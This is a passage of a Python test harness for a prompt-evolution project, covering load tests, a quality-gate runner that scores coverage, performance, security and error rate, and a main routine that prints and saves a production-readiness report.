                for future in futures:
                    user_results = future.result(timeout=30)
                    all_results.extend(user_results)
            
            # Analyze results
            total_requests = len(all_results)
            avg_response_time = sum(all_results) / len(all_results)
            max_response_time = max(all_results)
            successful_requests = len(all_results)
            
            # Performance thresholds
            max_avg_response_time = 0.1  # 100ms average
            max_max_response_time = 0.5  # 500ms maximum
            
            execution_time = time.time() - start_time
            return TestResult(
                test_name="Concurrent Load",
                status="PASS" if (avg_response_time <= max_avg_response_time and 
                                max_response_time <= max_max_response_time) else "FAIL",
                execution_time=execution_time,
                details={
                    "concurrent_users": num_concurrent_users,
                    "requests_per_user": requests_per_user,
                    "total_requests": total_requests,
                    "successful_requests": successful_requests,
                    "avg_response_time": avg_response_time,
                    "max_response_time": max_response_time,
                    "thresholds": {
                        "max_avg_response_time": max_avg_response_time,
                        "max_max_response_time": max_max_response_time
                    }
                }
            )
            
        except Exception as e:
            execution_time = time.time() - start_time
            return TestResult(
                test_name="Concurrent Load",
                status="FAIL",
                execution_time=execution_time,
                error_message=str(e)
            )
    
    def _test_large_population_load(self) -> TestResult:
        """Test handling of large population sizes."""
        start_time = time.time()
        
        try:
            from meta_prompt_evolution.evolution.population import Prompt, PromptPopulation
            
            # Test with increasingly large populations
            population_sizes = [100, 500, 1000, 2000]
            load_results = []
            
            for size in population_sizes:
                size_start = time.time()
                
                # Create large population
                prompts = [
                    Prompt(text=f"Large population test prompt {i} with extended content for memory testing")
                    for i in range(size)
                ]
                
                population = PromptPopulation(prompts)
                
                # Simulate operations on large population
                for prompt in population:
                    prompt.fitness_scores = {"fitness": 0.5, "accuracy": 0.6}
                
                # Test top-k selection
                top_k = population.get_top_k(min(50, size))
                
                size_time = time.time() - size_start
                memory_estimate = size * 1000  # Rough estimate in bytes
                
                load_results.append({
                    "population_size": size,
                    "processing_time": size_time,
                    "top_k_size": len(top_k),
                    "memory_estimate": memory_estimate
                })
            
            # Check scalability
            max_processing_time = max(result["processing_time"] for result in load_results)
            largest_population = max(result["population_size"] for result in load_results)
            
            # Performance thresholds
            max_allowed_time = 5.0  # 5 seconds for largest population
            
            execution_time = time.time() - start_time
            return TestResult(
                test_name="Large Population Load",
                status="PASS" if max_processing_time <= max_allowed_time else "FAIL",
                execution_time=execution_time,
                details={
                    "population_sizes_tested": population_sizes,
                    "largest_population": largest_population,
                    "max_processing_time": max_processing_time,
                    "threshold_time": max_allowed_time,
                    "load_results": load_results
                }
            )
            
        except Exception as e:
            execution_time = time.time() - start_time
            return TestResult(
                test_name="Large Population Load",
                status="FAIL",
                execution_time=execution_time,
                error_message=str(e)
            )
    
    # Helper Methods
    def _simple_mutate(self, prompt):
        """Simple mutation for testing."""
        from meta_prompt_evolution.evolution.population import Prompt
        words = prompt.text.split()
        if words:
            words.append("enhanced")
        return Prompt(text=" ".join(words))
    
    def _simple_crossover(self, parent1, parent2):
        """Simple crossover for testing."""
        from meta_prompt_evolution.evolution.population import Prompt
        words1 = parent1.text.split()
        words2 = parent2.text.split()
        
        mid1 = len(words1) // 2
        mid2 = len(words2) // 2
        
        child_words = words1[:mid1] + words2[mid2:]
        return Prompt(text=" ".join(child_words))
    
    def _compile_test_report(self, suite_results: Dict[str, Any]) -> Dict[str, Any]:
        """Compile comprehensive test report."""
        total_tests = 0
        total_passed = 0
        total_failed = 0
        total_errors = 0
        
        for suite_name, suite_result in suite_results.items():
            if suite_result.get("status") == "ERROR":
                total_errors += 1
            elif "summary" in suite_result:
                total_tests += suite_result["summary"]["total"]
                total_passed += suite_result["summary"]["passed"] 
                total_failed += suite_result["summary"]["failed"]
        
        overall_pass_rate = total_passed / total_tests if total_tests > 0 else 0.0
        execution_time = self.end_time - self.start_time if self.end_time and self.start_time else 0
        
        return {
            "overall_status": "PASS" if total_failed == 0 and total_errors == 0 else "FAIL",
            "execution_time": execution_time,
            "summary": {
                "total_tests": total_tests,
                "passed": total_passed,
                "failed": total_failed,
                "errors": total_errors,
                "pass_rate": overall_pass_rate,
                "suites_run": len(suite_results)
            },
            "suite_results": suite_results,
            "recommendations": self._generate_recommendations(suite_results),
            "quality_score": self._calculate_quality_score(suite_results)
        }
    
    def _generate_recommendations(self, suite_results: Dict[str, Any]) -> List[str]:
        """Generate recommendations based on test results."""
        recommendations = []
        
        for suite_name, suite_result in suite_results.items():
            if suite_result.get("status") == "FAIL":
                recommendations.append(f"Address failures in {suite_name} test suite")
            
            if suite_result.get("status") == "ERROR":
                recommendations.append(f"Fix errors in {suite_name} test suite configuration")
            
            # Specific recommendations based on test types
            if "Performance" in suite_name and suite_result.get("status") != "PASS":
                recommendations.append("Optimize performance bottlenecks identified in testing")
            
            if "Security" in suite_name and suite_result.get("status") != "PASS":
                recommendations.append("Strengthen security measures based on test findings")
            
            if "Load" in suite_name and suite_result.get("status") != "PASS":
                recommendations.append("Improve system scalability for high-load scenarios")
        
        # General recommendations
        if not recommendations:
            recommendations.append("All tests passed - system is ready for production")
        else:
            recommendations.append("Run tests again after addressing identified issues")
        
        return recommendations
    
    def _calculate_quality_score(self, suite_results: Dict[str, Any]) -> float:
        """Calculate overall quality score."""
        if not suite_results:
            return 0.0
        
        suite_scores = []
        
        for suite_result in suite_results.values():
            if suite_result.get("status") == "PASS":
                suite_scores.append(1.0)
            elif suite_result.get("status") == "FAIL":
                # Partial credit based on pass rate
                if "summary" in suite_result and suite_result["summary"]["total"] > 0:
                    suite_scores.append(suite_result["summary"]["pass_rate"])
                else:
                    suite_scores.append(0.0)
            else:  # ERROR
                suite_scores.append(0.0)
        
        return sum(suite_scores) / len(suite_scores) if suite_scores else 0.0
    
    def shutdown(self):
        """Shutdown test runner and clean up resources."""
        if self.executor:
            self.executor.shutdown(wait=True)


class QualityGateRunner:
    """Quality gate evaluation system."""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__ + ".QualityGateRunner")
        self.gate_results = []
    
    def run_quality_gates(self, test_results: Dict[str, Any]) -> Dict[str, Any]:
        """Run all quality gates and return results."""
        self.logger.info("Running quality gates evaluation")
        
        gates = [
            ("Test Coverage", self._check_test_coverage, test_results, 0.85),
            ("Performance Standards", self._check_performance_standards, test_results, 0.8),
            ("Security Compliance", self._check_security_compliance, test_results, 0.9),
            ("Error Rate", self._check_error_rate, test_results, 0.95),
            ("Code Quality", self._check_code_quality, test_results, 0.8)
        ]
        
        gate_results = []
        
        for gate_name, gate_func, data, threshold in gates:
            try:
                result = gate_func(data, threshold)
                gate_results.append(result)
            except Exception as e:
                self.logger.error(f"Quality gate {gate_name} failed: {e}")
                gate_results.append(QualityGateResult(
                    gate_name=gate_name,
                    status="ERROR",
                    score=0.0,
                    threshold=threshold,
                    details={"error": str(e)},
                    recommendations=[f"Fix quality gate {gate_name} implementation"]
                ))
        
        # Compile overall quality gate report
        return self._compile_quality_report(gate_results)
    
    def _check_test_coverage(self, test_results: Dict[str, Any], threshold: float) -> QualityGateResult:
        """Check test coverage quality gate."""
        # Calculate coverage based on test results
        total_tests = test_results.get("summary", {}).get("total_tests", 0)
        passed_tests = test_results.get("summary", {}).get("passed", 0)
        
        coverage_score = passed_tests / total_tests if total_tests > 0 else 0.0
        
        recommendations = []
        if coverage_score < threshold:
            recommendations.append(f"Increase test coverage from {coverage_score:.1%} to {threshold:.1%}")
            recommendations.append("Add more unit tests for core components")
            recommendations.append("Implement integration tests for critical paths")
        
        return QualityGateResult(
            gate_name="Test Coverage",
            status="PASS" if coverage_score >= threshold else "FAIL",
            score=coverage_score,
            threshold=threshold,
            details={
                "total_tests": total_tests,
                "passed_tests": passed_tests,
                "coverage_percentage": coverage_score * 100
            },
            recommendations=recommendations
        )
    
    def _check_performance_standards(self, test_results: Dict[str, Any], threshold: float) -> QualityGateResult:
        """Check performance standards quality gate."""
        # Extract performance metrics
        suite_results = test_results.get("suite_results", {})
        performance_tests = suite_results.get("Performance Tests", {})
        
        if not performance_tests or performance_tests.get("status") == "ERROR":
            return QualityGateResult(
                gate_name="Performance Standards",
                status="FAIL",
                score=0.0,
                threshold=threshold,
                details={"error": "Performance tests not available"},
                recommendations=["Implement comprehensive performance testing"]
            )
        
        performance_score = performance_tests.get("summary", {}).get("pass_rate", 0.0)
        
        recommendations = []
        if performance_score < threshold:
            recommendations.append("Optimize system performance bottlenecks")
            recommendations.append("Implement caching strategies")
            recommendations.append("Review algorithmic complexity")
        
        return QualityGateResult(
            gate_name="Performance Standards",
            status="PASS" if performance_score >= threshold else "FAIL",
            score=performance_score,
            threshold=threshold,
            details={
                "performance_test_results": performance_tests.get("summary", {}),
                "bottlenecks_identified": performance_score < threshold
            },
            recommendations=recommendations
        )
    
    def _check_security_compliance(self, test_results: Dict[str, Any], threshold: float) -> QualityGateResult:
        """Check security compliance quality gate."""
        suite_results = test_results.get("suite_results", {})
        security_tests = suite_results.get("Security Tests", {})
        
        if not security_tests or security_tests.get("status") == "ERROR":
            return QualityGateResult(
                gate_name="Security Compliance",
                status="FAIL",
                score=0.0,
                threshold=threshold,
                details={"error": "Security tests not available"},
                recommendations=["Implement comprehensive security testing"]
            )
        
        security_score = security_tests.get("summary", {}).get("pass_rate", 0.0)
        
        recommendations = []
        if security_score < threshold:
            recommendations.append("Address security vulnerabilities identified in testing")
            recommendations.append("Strengthen input validation")
            recommendations.append("Implement additional security controls")
        
        return QualityGateResult(
            gate_name="Security Compliance",
            status="PASS" if security_score >= threshold else "FAIL",
            score=security_score,
            threshold=threshold,
            details={
                "security_test_results": security_tests.get("summary", {}),
                "vulnerabilities_found": security_score < threshold
            },
            recommendations=recommendations
        )
    
    def _check_error_rate(self, test_results: Dict[str, Any], threshold: float) -> QualityGateResult:
        """Check error rate quality gate."""
        summary = test_results.get("summary", {})
        total_tests = summary.get("total_tests", 0)
        errors = summary.get("errors", 0)
        
        error_rate = errors / total_tests if total_tests > 0 else 0.0
        success_rate = 1.0 - error_rate
        
        recommendations = []
        if success_rate < threshold:
            recommendations.append("Reduce system error rate")
            recommendations.append("Improve error handling and recovery")
            recommendations.append("Fix failing test cases")
        
        return QualityGateResult(
            gate_name="Error Rate",
            status="PASS" if success_rate >= threshold else "FAIL",
            score=success_rate,
            threshold=threshold,
            details={
                "total_tests": total_tests,
                "errors": errors,
                "error_rate": error_rate * 100,
                "success_rate": success_rate * 100
            },
            recommendations=recommendations
        )
    
    def _check_code_quality(self, test_results: Dict[str, Any], threshold: float) -> QualityGateResult:
        """Check code quality metrics."""
        # This is a simplified code quality check based on test results
        overall_quality = test_results.get("quality_score", 0.0)
        
        recommendations = []
        if overall_quality < threshold:
            recommendations.append("Improve code quality metrics")
            recommendations.append("Refactor complex components")
            recommendations.append("Add documentation and comments")
            recommendations.append("Follow coding standards and best practices")
        
        return QualityGateResult(
            gate_name="Code Quality",
            status="PASS" if overall_quality >= threshold else "FAIL",
            score=overall_quality,
            threshold=threshold,
            details={
                "quality_metrics": {
                    "overall_quality": overall_quality,
                    "test_quality": test_results.get("summary", {}).get("pass_rate", 0.0)
                }
            },
            recommendations=recommendations
        )
    
    def _compile_quality_report(self, gate_results: List[QualityGateResult]) -> Dict[str, Any]:
        """Compile overall quality gate report."""
        passed_gates = sum(1 for gate in gate_results if gate.status == "PASS")
        total_gates = len(gate_results)
        overall_score = sum(gate.score for gate in gate_results) / len(gate_results) if gate_results else 0.0
        
        # Determine overall status
        if all(gate.status == "PASS" for gate in gate_results):
            overall_status = "PASS"
        elif any(gate.status == "ERROR" for gate in gate_results):
            overall_status = "ERROR"
        else:
            overall_status = "FAIL"
        
        # Collect all recommendations
        all_recommendations = []
        for gate in gate_results:
            all_recommendations.extend(gate.recommendations)
        
        return {
            "overall_status": overall_status,
            "overall_score": overall_score,
            "gates_passed": passed_gates,
            "gates_total": total_gates,
            "pass_percentage": (passed_gates / total_gates * 100) if total_gates > 0 else 0,
            "gate_results": [asdict(gate) for gate in gate_results],
            "recommendations": list(set(all_recommendations)),  # Remove duplicates
            "production_ready": overall_status == "PASS" and overall_score >= 0.8
        }


def main():
    """Main execution function for comprehensive testing."""
    print("🔬 Meta-Prompt-Evolution-Hub - Comprehensive Quality Gates & Testing")
    print("✅ Production-ready testing, validation, and quality assurance")
    print("=" * 80)
    
    try:
        # Configure test suite
        config = TestSuiteConfig(
            enable_unit_tests=True,
            enable_integration_tests=True,
            enable_performance_tests=True,
            enable_security_tests=True,
            enable_load_tests=True,
            max_test_duration=120,
            parallel_execution=True,
            max_workers=4
        )
        
        # Run comprehensive test suite
        print("🧪 Running comprehensive test suite...")
        test_runner = TestRunner(config)
        test_results = test_runner.run_all_tests()
        
        print(f"📊 Test Suite Results:")
        print(f"   Status: {test_results['overall_status']}")
        print(f"   Total Tests: {test_results['summary']['total_tests']}")
        print(f"   Passed: {test_results['summary']['passed']}")
        print(f"   Failed: {test_results['summary']['failed']}")
        print(f"   Pass Rate: {test_results['summary']['pass_rate']:.1%}")
        print(f"   Quality Score: {test_results['quality_score']:.3f}")
        print(f"   Execution Time: {test_results['execution_time']:.2f}s")
        
        # Run quality gates
        print("\\n🚪 Running quality gates...")
        gate_runner = QualityGateRunner()
        quality_results = gate_runner.run_quality_gates(test_results)
        
        print(f"\\n🎯 Quality Gate Results:")
        print(f"   Overall Status: {quality_results['overall_status']}")
        print(f"   Overall Score: {quality_results['overall_score']:.3f}")
        print(f"   Gates Passed: {quality_results['gates_passed']}/{quality_results['gates_total']}")
        print(f"   Pass Percentage: {quality_results['pass_percentage']:.1f}%")
        print(f"   Production Ready: {'✅ YES' if quality_results['production_ready'] else '❌ NO'}")
        
        # Save comprehensive results
        results_dir = Path("demo_results")
        results_dir.mkdir(exist_ok=True)
        
        comprehensive_results = {
            "timestamp": time.time(),
            "test_results": test_results,
            "quality_gates": quality_results,
            "system_status": {
                "tests_passed": test_results['overall_status'] == "PASS",
                "quality_gates_passed": quality_results['overall_status'] == "PASS",
                "production_ready": quality_results['production_ready'],
                "overall_health": "HEALTHY" if quality_results['production_ready'] else "NEEDS_ATTENTION"
            }
        }
        
        with open(results_dir / "comprehensive_quality_report.json", "w") as f:
            json.dump(comprehensive_results, f, indent=2, default=str)
        
        # Display recommendations
        if quality_results['recommendations']:
            print("\\n📋 RECOMMENDATIONS:")
            for i, rec in enumerate(quality_results['recommendations'][:10], 1):
                print(f"   {i}. {rec}")
        
        print("\\n" + "=" * 80)
        if quality_results['production_ready']:
            print("🎉 SYSTEM IS PRODUCTION READY!")
            print("✅ All quality gates passed")
            print("✅ Comprehensive testing completed successfully")
            print("✅ Ready for production deployment")
        else:
            print("⚠️  SYSTEM REQUIRES ATTENTION")
            print("❌ Some quality gates failed")
            print("📝 Address recommendations before production deployment")
        
        print(f"\\n📁 Detailed results saved to: {results_dir}/comprehensive_quality_report.json")
        
        # Cleanup
        test_runner.shutdown()
        
        return quality_results['production_ready']
        
    except Exception as e:
        print(f"\\n❌ Quality testing failed: {e}")
        import traceback
        traceback.print_exc()
        return False


if __name__ == "__main__":
    success = main()
    exit(0 if success else 1)